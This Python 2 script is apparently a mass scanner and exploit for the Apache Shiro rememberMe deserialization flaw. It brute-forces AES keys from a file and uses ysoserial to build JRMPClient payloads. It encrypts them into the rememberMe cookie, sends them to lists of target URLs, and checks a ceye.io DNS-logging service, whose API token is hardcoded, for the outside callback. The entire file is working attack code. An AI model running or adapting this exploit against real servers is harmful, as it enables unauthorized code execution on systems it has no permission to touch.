import os
import re
import base64
import uuid,time
import subprocess
import requests,sys
from Crypto.Cipher import AES
import json
import random,argparse,Queue,threading
import warnings


warnings.filterwarnings("ignore")
JAR_FILE = '../ysoserial.jar'
scan_count = 0


def poc(url, ip, key_):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    try:
        payload = generator(ip, JAR_FILE, key_)
        r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10,verify=False) 
    except:
        pass
    return False


def generator(ip, fp, key_):
  if not os.path.exists(fp):
    raise Exception('jar file not found!')
  popen = subprocess.Popen(['java', '-jar', fp, 'JRMPClient', ip],
                             stdout=subprocess.PIPE)        
  BS = AES.block_size
  pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
  mode = AES.MODE_CBC
  iv = uuid.uuid4().bytes
  encryptor = AES.new(base64.b64decode(key_), mode, iv)
  file_body = pad(popen.stdout.read())
  base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
  return base64_ciphertext

def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("QWERTYUIOPASDFGHJKLZXCVBNM1234567890"))
    return str(str1)


def check_vuln():
    with open('key.txt', 'r') as f:
        key = f.readlines()
    global scan_count
    while True:
        try :
            web_url = queue.get(timeout=0.1)
            scan_count+=1
        except:
            break
        # try:
        for key_ in key:
                rand = random_str(8)
                key__ = key_.replace('\n',"")
                poc(web_url,"%s.tuq75v.ceye.io" % rand, key__)
                req = requests.get('http://api.ceye.io/v1/records?token=f7983f63a043ee2d95d109cdb901f279&type=dns&filter='+rand)
                if json.loads(req.text)['data']:
                    print '[+] ' + key__ + ' is right; random is ' + rand
                    print '[+] %s' % web_url
                    break
        print '[-] %s is safe' % web_url
        #except:
        #  pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,
                                    description='Apache Shiro Scanner.By Stu.',
                                    usage='scan.py [optional]')
    parser.add_argument('-f',metavar='File',type=str,default='url.txt',help='Put Web url in url.txt')
    parser.add_argument('-u',metavar='Url',type=str,help='Put a Web url')
    parser.add_argument('-t',metavar='THREADS',type=int,default='10',help='Num of scan threads,default 100')

    if len(sys.argv)==1:
        sys.argv.append('-h')
    args = parser.parse_args()
    start_time = time.time()
    if args.u is None:
        queue = Queue.Queue()
        for web_url in open(args.f).xreadlines():
            web_url = web_url.strip() 
            if not web_url:
                continue
            queue.put(web_url)

        threads = []
        for i in range(args.t):
            t = threading.Thread(target=check_vuln)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
    else:
    	queue = Queue.Queue()
        queue.put(args.u)
        check_vuln()
    print ('[+] Done. %s weburl scanned in %.1f seconds.' % (scan_count,time.time() - start_time))
